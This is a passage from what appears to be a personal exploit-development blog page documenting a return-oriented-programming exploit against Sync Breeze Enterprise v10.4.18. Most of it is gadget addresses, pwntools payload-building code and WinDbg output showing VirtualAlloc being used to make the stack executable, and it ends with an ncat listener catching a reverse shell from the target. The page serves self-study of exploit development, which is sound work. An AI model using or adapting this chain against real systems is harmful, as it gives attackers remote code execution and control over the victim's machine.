  16A000 [     614] address [size] of Import Address Table Directory
       0 [       0] address [size] of Delay Import Directory
       0 [       0] address [size] of COR20 Header Directory
       0 [       0] address [size] of Reserved Directory
0:007&gt; dps 0x10000000+0x16A000 0x10000000+0x16A000+614*4
... snip ...
1016a044  773b3850 KERNEL32!WriteFile
1016a048  773b1bd0 KERNEL32!DisableThreadLibraryCallsStub
1016a04c  773b3670 KERNEL32!GetFullPathNameW
1016a050  773ae220 KERNEL32!MultiByteToWideCharStub
1016a0ac  773b3180 KERNEL32!CloseHandle
1016a0b0  773b3760 KERNEL32!ReadFile</code></pre>
</doc-codeblock></div>
<p>Going to use:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">1016a0b0  773b3760 KERNEL32!ReadFile</code></pre>
</doc-codeblock></div>
<p>Now to find the offset to <code v-pre>KERNELBASE!VirtualProtect</code> (same method as above but for kernel32 instead of libspp.dll)</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">77411594  7728b770 KERNELBASE!VirtualAlloc</code></pre>
</doc-codeblock></div>
<p>So we need an offset of <code v-pre>0x77411594 - 0x773b3760 = 0x05DE34</code></p>
<p>So the chain we need is</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">pop esi; ret; # 0x1016a0b0 is on the stack
mov esi, dword ptr [esi]; ret;
add esi, 0x05DE34; ret;
mov esi, dword ptr [esi]; ret;</code></pre>
</doc-codeblock></div>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10043073: pop esi; ret;</code></pre>
</doc-codeblock></div>
<p>I couldnt find a <code v-pre>mov esi, dword ptr [esi]; ret;</code> but found one for <code v-pre>eax</code> instead, so changing the rop chain to look like this:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10064def: pop edi; ret;
0x10040826: ret;
0x100fd644: pop eax; ret;
0x1016a0b0
0x1014fc8c: mov eax, dword ptr [eax]; ret;
0x1005edc5: pop ebp; ret;
0x05de34; 
0x100e5194: add eax, ebp; salc; ret;
0x10138850: mov esi, dword ptr [eax]; push eax; call edi;</code></pre>
</doc-codeblock></div>
<p>The above is super close, the only issue is <code v-pre>0x05de34</code> will be padded to include a null byte. Instead of <code v-pre>add eax, ebp</code> we could do <code v-pre>sub eax, ebp</code> and have <code v-pre>ebp</code> be a negative so it is basically the same.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10064def: pop edi; ret;
0x10040826: ret;
0x100fd644: pop eax; ret;
0x1016a0b0
0x1014fc8c: mov eax, dword ptr [eax]; ret;
0x1005edc5: pop ebp; ret;
0x100000000 - 0x05de34;
0x1014e1a8: sub eax, ebp; pop esi; pop ebp; pop ebx; ret;
0x90909090
0x90909090
0x90909090
0x10138850: mov esi, dword ptr [eax]; push eax; call edi;</code></pre>
</doc-codeblock></div>
<p>That should be the final chain!</p>
<p>After adding it to python and re crashing the app. Running this I got one thing wrong, there should be a <code v-pre>pop pop ret</code> in edi not a <code v-pre>ret</code></p>
<p>Giving the final chain of:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x100fd644: pop eax; ret;
0x1016a0b0
0x1014fc8c: mov eax, dword ptr [eax]; ret;
0x1005edc5: pop ebp; ret;
0x100000000 - 0x05de34;
0x1014e1a8: sub eax, ebp; pop esi; pop ebp; pop ebx; ret;
0x90909090
0x90909090
0x90909090
0x10064def: pop edi; ret;
0x1015a2f0: pop eax; pop ebx; ret;
0x10138850: mov esi, dword ptr [eax]; push eax; call edi;</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="setting-the-rest-of-the-registers">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#setting-the-rest-of-the-registers">#</doc-anchor-trigger>
        <span>Setting the rest of the registers</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="eax">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#eax">#</doc-anchor-trigger>
        <span>EAX</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x100fd644: pop eax; ret;
0x90909090</code></pre>
</doc-codeblock></div>
<p>easy</p>
<doc-anchor-target id="ebp">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#ebp">#</doc-anchor-trigger>
        <span>EBP</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x100bc9e5: push esp; ret;</code></pre>
</doc-codeblock></div>
<p>It&#x27;s the same as a <code v-pre>jmp esp;</code></p>
<doc-anchor-target id="edi">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#edi">#</doc-anchor-trigger>
        <span>EDI</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10064def: pop edi; ret;
0x10040826:  ret; </code></pre>
</doc-codeblock></div>
<doc-anchor-target id="ebx">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#ebx">#</doc-anchor-trigger>
        <span>EBX</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10064def: pop edi; ret;
0x10040826:  ret; 
0x100430c7: pop ebx; ret;
0xFFFFFFFF
0x101260ab: inc ebx; add al, 0x50; call edi;
0x101260ab: inc ebx; add al, 0x50; call edi;</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="ecx">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#ecx">#</doc-anchor-trigger>
        <span>ECX</span>
    </h3>
</doc-anchor-target>
<p>As we cant just directly pop 0x40 into the register I found a chain that will increment it by 0x10.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10041e60: xor ecx, ecx; cmp eax, 1; sete cl; mov eax, ecx; ret;
0x100fd644: pop eax; ret;
0x90909090
0x10157580: add ecx, 0x10; cmp eax, 0x28; jb 0x15757b; xor eax, eax; ret;
0x100fd644: pop eax; ret;
0x90909090
0x10157580: add ecx, 0x10; cmp eax, 0x28; jb 0x15757b; xor eax, eax; ret;
0x100fd644: pop eax; ret;
0x90909090
0x10157580: add ecx, 0x10; cmp eax, 0x28; jb 0x15757b; xor eax, eax; ret;
0x100fd644: pop eax; ret;
0x90909090
0x10157580: add ecx, 0x10; cmp eax, 0x28; jb 0x15757b; xor eax, eax; ret;
</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="edx">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#edx">#</doc-anchor-trigger>
        <span>EDX</span>
    </h3>
</doc-anchor-target>
<p>This was annoying to set up, but it was easy once I found the <code v-pre>mov edx, eax; sar edx, 8;</code> gadget.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10043c28: pop ecx; ret;
0x1020f040 # writeable addr
0x100fd644: pop eax; ret;
0xFFFF0FFF
0x10060ec8: inc eax; ret;
0x10142f9d: mov edx, eax; mov byte ptr [ecx + 5], al; sar edx, 8; mov byte ptr [ecx + 4], dl; ret;
0x10154f1a: sar edx, 8; mov byte ptr [eax], dl; ret;</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="reorder-gadgets">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reorder-gadgets">#</doc-anchor-trigger>
        <span>Reorder gadgets</span>
    </h2>
</doc-anchor-target>
<p>The edx, ecx and esi chains are messy so there is a high chance they will break previously set registers.</p>
<p>ecx breaks: <code v-pre>eax</code>
edx breaks: <code v-pre>ecx, eax</code>
esi breaks: <code v-pre>eax, ebp, edi, esi, ebx</code></p>
<p>So the order should be:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">esi
edx
ecx
# the rest</code></pre>
</doc-codeblock></div>
<p>Giving the final rop chain of:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">#ESI = pointer to VirtualAlloc
body += pwn.p32(addr_popeaxret)
body += pwn.p32(addr_iattable)
body += pwn.p32(addr_derefeaxret)
body += pwn.p32(addr_popebpret)
body += pwn.p32(0x100000000 - 0x05de34)
body += pwn.p32(addr_subeaxebp_pppr_ret)
body += pwn.p32(0x90909090)*3
body += pwn.p32(addr_popediret)
body += pwn.p32(addr_ppr)
body += pwn.p32(addr_derefeaxesi_calledi)

#EDX = flAllocationType #0x1000 
body += pwn.p32(addr_popecxret)
body += pwn.p32(0x1020f040)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0xFFFF0FFF)
body += pwn.p32(addr_incecxret)
body += pwn.p32(addr_movedxeax_saredx)
body += pwn.p32(addr_saredx)

#ECX = flProtect # 0x40
body += pwn.p32(addr_xorecx)
for i in range(3):
    body += pwn.p32(addr_popeaxret)
    body += pwn.p32(0x90909090)
    body += pwn.p32(addr_add0x10ecx)

#EAX = NOP (0x90909090)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0x90909090)

#EBP = pointer to JMP ESP
body += pwn.p32(addr_pushespret)

#EDI = ROPNOP (RET)
body += pwn.p32(addr_popediret)
body += pwn.p32(ropnop)

#EBX = dwSize # not 0
body += pwn.p32(addr_popebpret)
body += pwn.p32(0xFFFFFFFF)
body += pwn.p32(addr_incebx_calledi)
body += pwn.p32(addr_incebx_calledi)</code></pre>
</doc-codeblock></div>
<p>Running this and setting a breakpoint at the end, and it errors.</p>
<doc-anchor-target id="debugging">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#debugging">#</doc-anchor-trigger>
        <span>Debugging</span>
    </h2>
</doc-anchor-target>
<p>So close, the edx sar starting value is off.
I think it should be:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">body += pwn.p32(0x0FFF4040)</code></pre>
</doc-codeblock></div>
<p>As it will get shifted to <code v-pre>0x00000FFF</code> then incremented to <code v-pre>0x00001000</code></p>
<p>Trying again</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; 
(2924.cfc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0fff4041 ebx=77411594 ecx=1020f040 edx=00000fff esi=7728b770 edi=1015a2f0
eip=10154f1d esp=02d1fadc ebp=90909090 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libspp!pcre_exec+0x1108d:
10154f1d 8810            mov     byte ptr [eax],dl          ds:002b:0fff4041=??
0:007&gt; 
(2924.cfc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00000000 edx=77638fd0 esi=00000000 edi=00000000
eip=00000000 esp=02d1f6a8 ebp=02d1f6c8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
00000000 ??              ???</code></pre>
</doc-codeblock></div>
<p>...</p>
<p>First thing is that it inc needs to come after the sar</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">#EDX = flAllocationType #0x1000
body += pwn.p32(addr_popecxret)
body += pwn.p32(0x1020f040)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0x0FFF4040)
body += pwn.p32(addr_movedxeax_saredx)
body += pwn.p32(addr_incecxret)
body += pwn.p32(addr_saredx)</code></pre>
</doc-codeblock></div>
<p>Trying again.
Sam exception handler.</p>
<p>Oh the <code v-pre>addr_saredx</code> gadget is wrong. It should be:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10142fa2: sar edx, 8; mov byte ptr [ecx + 4], dl; ret;</code></pre>
</doc-codeblock></div>
<p>The inc also needs to be on edx</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x1012bb29: inc edx; mov ax, dx; ret;</code></pre>
</doc-codeblock></div>
<p>This breaks eax, which is fine as we already did that before.</p>
<p>This should be it.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">#EDX = flAllocationType #0x1000
body += pwn.p32(addr_popecxret)
body += pwn.p32(0x1020f040)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0x0FFF4040)
body += pwn.p32(addr_movedxeax_saredx)
body += pwn.p32(addr_saredx)
body += pwn.p32(addr_incedx)</code></pre>
</doc-codeblock></div>
<p>This didnt work, forgot to loop ecx 4 times, and ebp needs to have a <code v-pre>pop ebp</code> at the start. Also going to add a <code v-pre>pushad; ret;</code> and some nops to the end of the payload, as its getting super close.</p>
<p>EBX destroied ECX:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; 
eax=909090e0 ebx=77411595 ecx=00000040 edx=00001000 esi=7728b770 edi=10040826
eip=101260b0 esp=02cdfb2c ebp=ffffffff iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
libspp!SPP_ValueTrend::FormatValueString+0x870:
101260b0 8b4b08          mov     ecx,dword ptr [ebx+8] ds:002b:7741159d=7077260d
0:007&gt; 
eax=909090e0 ebx=77411595 ecx=7077260d edx=00001000 esi=7728b770 edi=10040826
eip=101260b3 esp=02cdfb2c ebp=ffffffff iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
libspp!SPP_ValueTrend::FormatValueString+0x873:
101260b3 51              push    ecx
0:007&gt;********</code></pre>
</doc-codeblock></div>
<p>This is weird as the gadget shouldnt do that. The gadget chain was wrong so going to rewrite it:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x100430c7: pop ebx; ret;
0xFFFFFFFF
0x101260ab: inc ebx; add al, 0x50; call edi;
0x101260ab: inc ebx; add al, 0x50; call edi;</code></pre>
</doc-codeblock></div>
<p>This will break the <code v-pre>eax</code> register as the <code v-pre>al</code> register is the lower 8-bits. Updating the rop chain and trying again.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; 
eax=00000050 ebx=00000000 ecx=00000040 edx=00001000 esi=7728b770 edi=10040826
eip=101260ae esp=02c9fb24 ebp=90909090 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
libspp!SPP_ValueTrend::FormatValueString+0x86e:
101260ae ffd7            call    edi {libspp!SCA_ClsFinder::SearchFile+0x416 (10040826)}
0:007&gt; 
eax=00000050 ebx=00000000 ecx=00000040 edx=00001000 esi=7728b770 edi=10040826
eip=10040826 esp=02c9fb20 ebp=90909090 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
libspp!SCA_ClsFinder::SearchFile+0x416:
10040826 c3              ret
0:007&gt; 
eax=00000050 ebx=00000000 ecx=00000040 edx=00001000 esi=7728b770 edi=10040826
eip=101260b0 esp=02c9fb24 ebp=90909090 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
libspp!SPP_ValueTrend::FormatValueString+0x870:
101260b0 8b4b08          mov     ecx,dword ptr [ebx+8] ds:002b:00000008=????????</code></pre>
</doc-codeblock></div>
<p>ahhh cause I&#x27;m doing a call there needs to be a PPR.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x100de5ef: pop eax; pop edi; ret 0xc;</code></pre>
</doc-codeblock></div>
<p>The <code v-pre>ret 0xc</code> is going to be annoying.</p>
<p>I think this is right:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">#EBX = dwSize # not 0
body += pwn.p32(addr_popebxret)
body += pwn.p32(0xFFFFFFFF)
for i in range(2):
    body += pwn.p32(addr_popediret)
    body += pwn.p32(addr_ppr0xc)
    body += pwn.p32(addr_incebx_calledi)
    body += pwn.p32(0x90909090)

#EDI = ROPNOP (RET)
body += pwn.p32(addr_popediret)
body += pwn.p32(ropnop)</code></pre>
</doc-codeblock></div>
<p>It should be 1 as its 3 for the 0xc and 8 are taken by the PPR.</p>
<p>So turns out a lot was wrong. I single stepped and changed a few things, it now looks like this:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">#EBX = dwSize # not 0
#EDI = ROPNOP (RET)
body += pwn.p32(addr_popebxret)
body += pwn.p32(0xFFFFFFFF)
body += pwn.p32(addr_popediret)
body += pwn.p32(addr_ppr0xc)
body += pwn.p32(addr_incebx_calledi)
body += b'A'*4
body += pwn.p32(addr_popediret)
body += pwn.p32(0x90909090)*3
body += pwn.p32(addr_ppr0xc)
body += pwn.p32(addr_incebx_calledi)
body += pwn.p32(ropnop)

#EAX = NOP (0x90909090)
body += pwn.p32(addr_popeaxret)
body += pwn.p32(0x90909090)*3
body += pwn.p32(0x90909090)</code></pre>
</doc-codeblock></div>
<p>And this works!!!</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; 
eax=02cbf000 ebx=00000001 ecx=97640000 edx=02cbf000 esi=7728b770 edi=10040826
eip=02cbfb62 esp=02cbfb60 ebp=100bc9e5 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
02cbfb62 90              nop
0:007&gt; !@esp
@esp is not extension gallery command
No export @esp found
0:007&gt; !address @esp

                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Stack
Base Address:           02cbf000
End Address:            02cc0000
Region Size:            00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000040          PAGE_EXECUTE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        02bc0000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              ~7k

Content source: 1 (target), length: 4a0</code></pre>
</doc-codeblock></div>
<p>Which means shell time!</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">ncat -vlnp 9001
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 192.168.1.254:55191.
Microsoft Windows [Version 10.0.19045.4957]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Sync Breeze Enterprise\bin&gt;
</code></pre>
</doc-codeblock></div>
<p>SHELL!!</p>
<doc-anchor-target id="fin">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#fin">#</doc-anchor-trigger>
        <span>Fin</span>
    </h2>
</doc-anchor-target>
<p>That derailed kinda quickly, towards the end I left out most of the debugging issues, as it was just me doing dumb stuff and not mathing right.</p>
<p>Surely there are better ways to optimise this and maybe use better gadgets, so I might revisit this later.</p>
<p>Full script is on github: <a href="https://github.com/ElJayRight/pocscripts/blob/main/sploit.py">https://github.com/ElJayRight/pocscripts/blob/main/sploit.py</a></p>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer id="retype-content-footer" class="clear-both">
                            
                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../research/parsing_pe_headers/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                <span class="block mt-1">Parsing PE Headers</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../windows-driver-exploitation/capcom.sys/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                <span class="block mt-1">CapCom.sys Exploitation</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
                                <div id="retype-footer-links" class="print:hidden">
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p> Copyright 2025. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="retype-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Sync Breeze Enterprise v10.4.18", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
